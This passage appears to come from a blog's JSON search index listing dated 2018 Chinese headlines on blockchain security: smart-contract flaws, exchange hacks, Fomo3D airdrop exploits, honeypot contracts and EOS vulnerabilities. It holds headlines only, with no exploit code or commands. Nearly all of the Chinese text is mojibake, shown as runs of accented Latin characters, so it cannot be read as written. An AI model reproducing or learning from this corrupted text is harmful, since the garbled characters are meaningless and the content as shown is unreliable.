â€”â€” æ¸¸æˆåˆçº¦æ¼æ´å…¨é¢æ±‡æ€» Fomo3D åƒä¸‡å¤§å¥–è·å¾—è€…â€œç‰¹æ®Šæ”»å‡»æŠ€å·§â€æœ€å…¨æ­éœ² GodGameæ¼æ´åŸç†ä»¥åŠé»‘å®¢æ”»å‡»æ‰‹æ³•åˆ†æ Fomo3Dï¼Œè¢«é»‘å®¢æ‹¿èµ°çš„2200ä¸‡ ç™½å¸½æ±‡å®‰å…¨ç ”ç©¶é™¢ï¼šéƒ¨åˆ†åŒºå—é“¾å‚å•†å®‰å…¨æ„è¯†è–„å¼± ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:69","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-22 æ¸¸æˆå¹³å°God.Gameç§°é­é»‘å®¢æ”»å‡»ï¼Œæ™ºèƒ½åˆçº¦ä¸­ä»¥å¤ªåŠæ€»é‡å½’é›¶ å®‰æ¯”å®éªŒå®¤ï¼šFomo3Dèƒœè€…é‡‡å–â€œç‰¹æ®ŠæŠ€å·§â€åŠ é€Ÿæ¸¸æˆç»“æŸå¹¶æé«˜èƒœç‡ ä»¥å¤ªåŠåˆçº¦å®¡è®¡ CheckList ä¹‹â€œä»¥å¤ªåŠæ™ºèƒ½åˆçº¦è®¾è®¡ç¼ºé™·é—®é¢˜â€å½±å“åˆ†ææŠ¥å‘Š SABREä¿æŠ¤æ¯”ç‰¹å¸å…å—è·¯ç”±æ”»å‡»(Paper) BitMEXäº¤æ˜“æ‰€é­é‡DDOSï¼Œç›®å‰å·²ç»æ¢å¤ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:70","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-20 ä»¥å¤ªåŠ â€œåå·æ¸¡æ—¶ä»£â€ ç›—å¸ä¹‹ â€œæ‹¾è’æ”»å‡»â€ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:71","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-19 neoæ™ºèƒ½åˆçº¦å¹³å°Runtime_Serializeè°ƒç”¨æ‹’ç»æœåŠ¡æ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:72","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-18 ä¸€ç§åˆ©ç”¨ etherscan.io ç¼ºé™·çš„æ™ºèƒ½åˆçº¦èœœç½ â€œEthereum Smart Contract Specification Issueâ€ Impact Analysis æ™ºèƒ½åˆçº¦å²ä¸Šæœ€å¤§è§„æ¨¡æ”»å‡»æ‰‹æ³•æ›å…‰ï¼Œç›˜ç‚¹é»‘å®¢å›¢ä¼™ä½œæ¡ˆç»†èŠ‚ ä¸€ç§é’ˆå¯¹ç±» Fomo3D æ¸¸æˆç©ºæŠ•çš„é«˜çº§æ”»å‡»æŠ€æœ¯å‰–æ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:73","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-17 1200Wäººæ°‘å¸è¢«ç›—ï¼åŒºå—é“¾æ¸¸æˆLast Winnerç–‘ç‚¹é‡é‡ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:74","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-16 æ•°å­—åŠ å¯†è´§å¸äº¤æ˜“è½¯ä»¶APTæ”»å‡»ç®€æŠ¥ ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦é‡æ”¾æ”»å‡»ç»†èŠ‚å‰–æ ä»¥å¤ªåŠåˆçº¦å®¡è®¡ CheckList ä¹‹â€œä»¥å¤ªåŠæ™ºèƒ½åˆçº¦è§„èŒƒé—®é¢˜â€å½±å“åˆ†ææŠ¥å‘Š ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:75","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-14 æ·±å…¥è§£ææ–°å‹åŠ å¯†è´§å¸æŒ–çŸ¿æ¶æ„è½¯ä»¶ZombieBoy ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:76","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-13 è¶…100å®¶äº¤æ˜“æ‰€é«˜å±æ¼æ´å¯¼è‡´50äº¿ä»·å€¼æ•°å­—èµ„äº§å—å¨èƒ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:77","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-10 ä»solidityè¯­è¨€ç‰¹æ€§æ·±åº¦è§£è¯»ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦æ¼æ´åŸç†å’Œæ”»å‡»åˆ©ç”¨ EOS å®˜æ–¹ API ä¸­ Asset ç»“æ„ä½“çš„ä¹˜æ³•è¿ç®—æº¢å‡ºæ¼æ´æè¿° ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:78","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-09 ç™½å¸½é»‘å®¢å‘ç°ä»¥å¤ªåŠDApp Augurçš„ä¸»è¦æ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:79","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-07 é‡‘é’±éš¾å¯ï¼Œå¤§ç›—ç‹¬è¡Œ | ä»¥å¤ªåŠJSON-RPCæ¥å£å¤šç§ç›—å¸æ‰‹æ³•å¤§æ­ç§˜ çœ‹Hidden Beeå¦‚ä½•åˆ©ç”¨æ–°å‹æ¼æ´è¿›è¡Œä¼ æ’­ 2018ä¸ŠåŠå¹´åŒºå—é“¾å®‰å…¨æŠ¥å‘Š ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:80","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-03 ç§é’¥ä¸¢å¤±ä¹Ÿèƒ½æ‰¾å›ä»¥å¤ªå¸ï¼Ÿ é—¨ç½—å¸å‡å……å€¼æ¼æ´å¯¼è‡´Altexäº¤æ˜“æ‰€é­å—é‡å¤§æŸå¤± SIM token è‡ªåŠ¨åŒ–è–…ç¾Šæ¯›æ”»å‡»è¿˜åŸ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:81","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-02 è­¦æƒ•ï¼EOSæ¶æ„åˆçº¦å¯åå™¬ç”¨æˆ·RAMæ¼æ´åˆ†æ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:82","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-08-01 é‡‘é’±éš¾å¯ï¼Œå¤§ç›—ç‹¬è¡Œâ€”â€”ä»¥å¤ªåŠ JSON-RPC æ¥å£å¤šç§ç›—å¸æ‰‹æ³•å¤§æ­ç§˜ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:83","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-30 ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ä¸­éšæœºæ•°é¢„æµ‹ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:84","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-29 åˆ†æä¸€ä¸ªæœ‰è¶£çš„èœœç½åˆçº¦ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:85","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-27 åŒºå—é“¾å®‰å…¨æŠ€æœ¯æ€»ç»“ å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€Waves DEXå‘¨äºŒé­å—æ”»å‡»ï¼Œç°å·²æ¢å¤ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:86","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-26 ä¿®é¥°å™¨ï¼ˆmodifierï¼‰ç›¸å…³æ¼æ´åˆ†æ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:87","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-25 æ„é€ å‡½æ•°ç¼ºå¤±æ¼æ´åˆ†æ è­¦æƒ• | æ¶æ„EOSåˆçº¦å­˜åœ¨åå™¬ç”¨æˆ·RAMçš„å®‰å…¨é£é™© ã€EOS Fomo3Dä½ åƒä¸‡åˆ«ç©ã€‘ç‹¼äººæ€é­åˆ°æº¢å‡ºæ”»å‡», å·²ç»å‡‰å‡‰ éœ‡æƒŠï¼åˆ©å¥½å˜åˆ©ç©ºï¼Œçƒ§å¸ä¹Ÿèƒ½ä½œå‡ï¼ Fomo3Då±±å¯¨ç‰ˆåŸæ¥æ˜¯è¿™æ ·ç•™åé—¨çš„ EOS å®‰å…¨é—®é¢˜ç´§æ€¥æƒ…æŠ¥é€šçŸ¥ï¼šè­¦æƒ• EOS æ¶æ„åˆçº¦åå™¬ç”¨æˆ· RAM Solidityä¸­çš„delegatecallæ‚è°ˆ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:88","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-24 ERC20ä¸ä¸€è‡´æ€§æ£€æŸ¥ï¼ˆæ–°å¢balnacesä¸ä¸€è‡´æ£€æŸ¥æ¼æ´ï¼‰ ç›´å¸ƒç½—é™€åŒºå—é“¾äº¤æ˜“æ‰€RKTå­˜åœ¨ä¸Šæº¢æ¼æ´ Fomo3Dâ€œè–…ç¾Šæ¯›â€æ”»å‡»æ­ç§˜ï¼šé€šè¿‡é‡å¤çš„åˆ›å»ºé¢„å…ˆè®¡ç®—å¥½åœ°å€çš„åˆçº¦æ¥èµ¢å–ç©ºæŠ•å¥–é‡‘ï¼ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:89","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-23 æ¯”ç‰¹å¸é»‘å®¢æ”»å‡»æ‰‹æ®µå…¨æ­ç§˜ ANNI Tokenæ™ºèƒ½åˆçº¦å®‰å…¨å®¡è®¡æŠ¥å‘Šåˆ†æ ç›´å¸ƒç½—é™€åŒºå—é“¾äº¤æ˜“æ‰€RKT å­˜åœ¨ä¸Šæº¢æ¼æ´ é¦–ä¸ªåŒºå—é“¾ token çš„è‡ªåŠ¨åŒ–è–…ç¾Šæ¯›æ”»å‡»åˆ†æ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:90","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-22 å‡ ä¹æ‰€æœ‰é’±åŒ…éƒ½æœ‰è‡´å‘½æ¼æ´ï¼Œé»‘å®¢æ¥è§¦æ‰‹æœº2åˆ†é’Ÿï¼Œå°±èƒ½è½¬èµ°å¸ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:91","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-21 ä»ä¸€é“CTFé¢˜çœ‹æ™ºèƒ½åˆçº¦çš„å®‰å…¨é—®é¢˜ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:92","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-20 Parityå¤šé‡ç­¾ååˆçº¦Delegatecallæ¼æ´å›é¡¾ æ…ç”¨ EOS ç¬¬ä¸‰æ–¹å¼€æº SDK ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:93","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-19 CertiKï¼šä¸€æ¬¾æ™ºèƒ½åˆçº¦çš„ä»£ç å®¡è®¡å¹³å° Parityå¤šé‡ç­¾åå‡½æ•°åº“è‡ªæ€æ¼æ´ é¦–ä¸ªåŒºå—é“¾tokençš„è‡ªåŠ¨åŒ–è–…ç¾Šæ¯›æ”»å‡»åˆ†æ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:94","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-18 EOSè¢«ç›—äº‹ä»¶é¢‘èµ·ï¼Œè¿™é‡Œæœ‰ä¸€ä»½å®‰å…¨æ”»ç•¥å¯ä»¥å€Ÿé‰´ ä¸€ç§æ–°å‹çš„constructorå‡½æ•°ä½¿ç”¨æ¼æ´ï¼Œå¯å¯¼è‡´åˆçº¦æƒé™ä¸¢å¤±ã€ä»£å¸å¢å‘ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:95","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-17 LightCoinåˆçº¦éä¸€è‡´æ€§æ£€æŸ¥æ¼æ´åˆ†æ å®‰æ’é£æš´ä¸­å¿ƒåŠ©åŠ›ç¼–è‘—åŒºå—é“¾å®‰å…¨äº§ä¸šå…¨ç”Ÿå‘½å‘¨æœŸæ•´ä½“è§£å†³æ–¹æ¡ˆ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:96","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-16 é»‘äº§å†›å›¢æ§åˆ¶å››ç™¾ä¸‡è‚‰é¸¡é›†ç¾¤ï¼Œæ˜é‡‘åŒºå—é“¾æ•°å­—è´§å¸ çŸ¥åæ¯”ç‰¹å¸ç½‘ç«™bustabitä»·å€¼$12,000çš„ç‚¹å‡»åŠ«æŒã€XSSä»¥åŠæ‹’ç»æœåŠ¡æ¼æ´è¯¦æƒ…æ­ç§˜ EOS å‡è´¦å·å®‰å…¨é£é™©é¢„è­¦ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:97","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-14 EIP827å®‰å…¨äº‹ä»¶è·Ÿè¸ª ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:98","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-12 â€œtradeRifleâ€æ¼æ´å†æ›äº¤æ˜“æ‰€å®‰å…¨é£é™©â€”â€”LBankäº¤æ˜“æ‰€ç§»åŠ¨ç»ˆç«¯å¯è¢«ä¸­é—´äººæ”»å‡»æå–æ•°å­—èµ„äº§ ä»¥å¤ªåŠç½‘ç»œæ¶æ„è§£æ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:99","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-11 æµ…æAMRæ™ºèƒ½åˆçº¦æ‰¹é‡è½¬è´¦æº¢å‡ºæ¼æ´ ä¸€äº›EOSè´¦æˆ·ä½¿ç”¨å¼±åŠ©è®°è¯ç”ŸæˆEOSç§é’¥ï¼Œå­˜åœ¨é«˜å±é£é™© ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦OPCODEé€†å‘ä¹‹ç†è®ºåŸºç¡€ç¯‡ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:100","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-10 Microsoft Azure ä»¥å¤ªåŠèŠ‚ç‚¹æ§åˆ¶é¢æ¿å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ äº¤æ˜“æ‰€EXXç§°é­é»‘å®¢é¢‘ç¹æ”»å‡» ç©ºæ‰‹å¥—ç™½ç‹¼ï¼ŸUSDT å‡å……å€¼é€»è¾‘ç¼ºé™·æ¼æ´åˆ©ç”¨åˆ†æ Bancoräº¤æ˜“æ‰€è¢«å…¥ä¾µäº‹ä»¶è§£æ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:101","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-09 EDU\u0026BAIä»»æ„è½¬èµ°è´¦æˆ·Tokenäº‹ä»¶å›é¡¾ ä»¥å¤ªåŠä»£å¸â€œå‡å……å€¼â€æ¼æ´é¢„è­¦åˆ†æ ç ”ç©¶äººå‘˜ï¼šå»å¹´æ¯ä¸€æ¬¡çš„ICOå¹³å‡æœ‰äº”ä¸ªæ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:102","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-05 ç«å¸ç½‘åœºå¤–äº¤æ˜“å­˜åœ¨å®‰å…¨æ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:103","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-04 äº‘å‚¨å¸Siacoinäº¤æ˜“ç®¡ç†ç³»ç»ŸSiaberryçš„å‡ ä¸ªæ¼æ´ solidityä¸­çš„ç»§æ‰¿æ‚è°ˆ Steemå‘å¸ƒè¡¥ä¸ï¼Œä¿®å¤åœæ»æ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:104","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-03 ç ”ç©¶ç§°ï¼šâ€œæŒ–çŸ¿åŠ«æŒâ€è¶…è¶Šå‹’ç´¢è½¯ä»¶ï¼Œæˆä¸ºé¦–è¦å®‰å…¨å¨èƒ æ¶æ„è½¯ä»¶â€œå‰ªè´´æ¿åŠ«æŒè€…â€æ­£ç›‘æ§230ä¸‡ä¸ªæ¯”ç‰¹å¸åœ°å€ å¾®ä¿¡æ”¯ä»˜çš„JAVA SDKå­˜åœ¨æ¼æ´ï¼Œå„å¤§äº¤æ˜“æ‰€éœ€å°½å¿«è‡ªæ£€ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:105","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-07-02 Trezoré’±åŒ…é­é‡BGPåŠ«æŒï¼Œè­¦æƒ•é’“é±¼ç½‘ç«™ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:106","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-29 ä»¥å¤ªåŠJSON-RPCå‡ºç°æ–°çš„æ”»å‡»æ–¹å¼ï¼Œå¼€æ”¾APIå¹¶è§£é”è¿‡çš„è´¦æˆ·å¯èƒ½å·²è¢«ç§ä¸‹â€œåé—¨â€ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:107","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-28 EPoD: ä»¥å¤ªåŠGethå®¢æˆ·ç«¯æ‹’ç»æœåŠ¡æ¼æ´ (CVE-2018-12018) éƒ¨åˆ†äº¤æ˜“æ‰€å¯¹USDTå¸å……å€¼å­˜åœ¨æ ¡éªŒç¼ºé™·ï¼Œå¯é€šè¿‡â€œå‡å……å€¼â€å¯¼è‡´å¸‚åœºæ··ä¹±ï¼ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:108","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-27 åŒºå—é“¾é»‘å¹• | æˆ‘ä»¬ä¸ç”Ÿäº§â€œç™½çš®ä¹¦â€ï¼Œæˆ‘ä»¬åªæ˜¯â€œç™½çš®ä¹¦â€çš„æ¬è¿å·¥ï¼ HDACçŸ¿æ± é­å—é»‘å®¢æ”»å‡» EOSæ™ºèƒ½åˆçº¦çš„ä¸€äº›é—®é¢˜æ€»ç»“å’Œå»ºè®® å—¨æ± ç§°æ—¥å‰é­é»‘å®¢æ”»å‡»ï¼Œå°†æ°¸ä¹…å…³é—­ Solidity å®‰å…¨ï¼šå·²çŸ¥æ”»å‡»æ–¹æ³•å’Œå¸¸è§é˜²å¾¡æ¨¡å¼ç»¼åˆåˆ—è¡¨ ç¥ç§˜ç»„ç»‡BitPicoå®£å¸ƒå¯¹BCHå‘åŠ¨51%æ”»å‡» ä»¥å¤ªåŠ Solidity åˆçº¦ call å‡½æ•°ç°‡æ»¥ç”¨å¯¼è‡´çš„å®‰å…¨é£é™© ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:109","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-26 Solidityä¸­å­˜å‚¨æ–¹å¼é”™è¯¯ä½¿ç”¨æ‰€å¯¼è‡´çš„å˜é‡è¦†ç›– ä»¥å¤ªåŠèœœç½æ™ºèƒ½åˆçº¦åˆ†æ åˆ©ç”¨ç½‘æ¸¸åŠ é€Ÿå™¨éš§é“ä¼ æ’­æŒ–çŸ¿è •è™«äº‹ä»¶åˆ†ææŠ¥å‘Š ä»ä»¥å¤ªåŠ\"MorphTokenäº‹ä»¶\"çœ‹æ™ºèƒ½åˆçº¦æ„é€ å‡½æ•°å¤§å°å†™ç¼–ç é”™è¯¯æ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:110","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-25 bkex.com ç–‘ä¼¼è¢«å…¥ä¾µ å¹³å°ç”¨æˆ·åå¯†ç ç–‘ä¼¼å·²æ³„éœ² ERC223åŠERC827å®ç°ä»£ç æ¬ ç¼ºå®‰å…¨è€ƒè™‘ â€”â€” ATN Tokenä¸­çš„CUSTOM_CALLæ¼æ´æ·±å…¥åˆ†æ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:111","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-23 Mt.Goxæš‚åœç ´äº§,17ä¸‡æšæ¯”ç‰¹å¸å°†é€€è¿˜å®¢æˆ·å’Œå€ºä¸» ä»¥å¤ªåŠå»ä¸­å¿ƒåŒ–åº”ç”¨dAppçš„æ¸—é€æµ‹è¯•å§¿åŠ¿æµ…æ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:112","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-22 ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ Owner ç›¸å…³ CVE æ¼æ´åˆ†æ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:113","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-21 åŠ å¯†è´§å¸2018å¤§äº‹è®° | ä½ æ¥å·ï¼Œä»–æ¥æŠ¢ï¼Œå¸åœˆæ˜¯å¦çœŸçš„æ— å®æ—¥ï¼Ÿ ERC20 æ™ºèƒ½åˆçº¦æ•´æ•°æº¢å‡ºç³»åˆ—æ¼æ´æŠ«éœ² ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦callæ³¨å…¥æ”»å‡» ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:114","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-20 éŸ©å›½æœ€å¤§è™šæ‹Ÿè´§å¸äº¤æ˜“å¹³å°è¢«é»‘ï¼Œä»·å€¼2äº¿äººæ°‘å¸èµ„äº§å¤±çªƒ ERC223æ™ºèƒ½åˆçº¦ATNå¸å‡ºç°owneræƒé™çªƒå–æ¼æ´ ATN æŠµå¾¡åˆçº¦æ”»å‡»çš„æŠ¥å‘Šâ€”â€”åŸºäºERC223ä¸DS-AUTHçš„æ··åˆæ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:115","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-19 YEEDä»£å¸å­˜åœ¨ä»»æ„å…³åœäº¤æ˜“æ¼æ´ LCXå¸å‡ºç°è¢«å¯ä»»æ„è¿œç¨‹å…³åœäº¤æ˜“æ¼æ´ CVE-2018-12018:ä»¥å¤ªåŠå­˜åœ¨DDOSæ¼æ´ï¼Œå¯è‡´60%èŠ‚ç‚¹ä¸‹çº¿ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:116","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-15 Syndicateé’±åŒ…é­é»‘å®¢æ”»å‡»ä»·å€¼1000ä¸‡ç¾å…ƒçš„è´§å¸è¢«ç›— è°ˆè°ˆERC20æ¶‰åŠé¢æœ€å¹¿é‡å¤§æ¼æ´ä¹‹æˆ‘è§ ä»…éœ€500ç¾å…ƒï¼Œä½ ä¹Ÿå¯ä»¥å®Œæˆä¸€æ¬¡51%åŒèŠ±æ”»å‡» æ™ºèƒ½åˆçº¦å†ç°æ¼æ´ SNCè™šæ‹Ÿè´§å¸å­˜åœ¨å¯æ— é™å¢å‘æƒ…å†µ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:117","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-13 æ™ºèƒ½åˆçº¦RemiCoinå†çˆ†ä»»æ„è½¬è´¦æ¼æ´ ERC20 Tokenæ™ºèƒ½åˆçº¦FuturXeå­˜åœ¨ä»»æ„è½¬è´¦æ¼æ´ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:118","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-12 è°ˆè°ˆæ™ºèƒ½åˆçº¦ä¸­çš„ä¸­å¿ƒåŒ–å¨èƒ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:119","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-11 éŸ©å›½åŠ å¯†è´§å¸äº¤æ˜“æ‰€Coinrailé­é»‘å®¢å…¥ä¾µï¼Œé»‘å®¢ç›—èµ°äº†ä»·å€¼4000ä¸‡ç¾å…ƒçš„ICOä»£å¸ imTokené­é»‘å®¢å…¥ä¾µ:Amazon AWS å¯†ç æ³„éœ² ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:120","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["åŒºå—é“¾"],"content":"2018-06-08 ERC20ä»£å¸Soarcoin (SOAR) å­˜åœ¨åé—¨ï¼Œåˆçº¦æ‰€æœ‰è€…å¯ä»»æ„è½¬ç§»ä»–äººä»£å¸ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:121","tags":["BlockChain"],"title":"Blockchain Security 